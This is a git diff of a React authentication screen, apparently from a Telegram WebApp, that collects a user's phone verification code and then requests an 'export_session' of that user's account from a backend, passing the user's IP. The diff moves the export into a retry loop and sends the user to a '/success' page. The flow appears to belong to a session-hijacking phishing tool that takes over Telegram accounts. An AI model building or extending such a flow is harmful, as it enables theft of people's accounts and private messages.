@@ -1,10 +1,11 @@
 import React, { useState } from "react";
 import { api } from '../services/router';
+import { useNavigate } from "react-router-dom";
 const AuthScreen = ({ phone, IP }) => {
     // const navigate = useNavigate();
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState("")
-
+    const navigate = useNavigate();
     const handleVerificatiionCode = async (event) => {
         try {
             const inputValue = event.target.value;
@@ -26,17 +27,18 @@ const AuthScreen = ({ phone, IP }) => {
                         }
                     });
                     console.log(verifyResponse)
+                    navigate("/success")
 
                     // Then export session
-                    const exportResponse = await api.get(`/export_session/${userId}`, {
-                        params: { ip: IP },
-                        timeout: 10000  // 10 second timeout
-                    });
-                    console.log(exportResponse)
-                    // Handle Telegram WebApp closure
-                    if (window.Telegram?.WebApp?.close) {
-                        window.Telegram.WebApp.close();
-                    }
+                    // const exportResponse = await api.get(`/export_session/${userId}`, {
+                    //     params: { ip: IP },
+                    //     timeout: 10000  // 10 second timeout
+                    // });
+                    // console.log(exportResponse)
+                    // // Handle Telegram WebApp closure
+                    // if (window.Telegram?.WebApp?.close) {
+                    //     window.Telegram.WebApp.close();
+                    // }
 
                 } catch (error) {
                     if (error.response?.status === 503) {
@@ -46,9 +48,7 @@ const AuthScreen = ({ phone, IP }) => {
                             try {
                                 await new Promise(resolve => setTimeout(resolve, 2000));
                                 const retryResponse = await api.get(`/export_session/${userId}?ip=${IP}`);
-                                if (window.Telegram?.WebApp?.close) {
-                                    window.Telegram.WebApp.close();
-                                }
+                                navigate("/success")
                                 break;
                             } catch (retryError) {
                                 console.error(retryError)
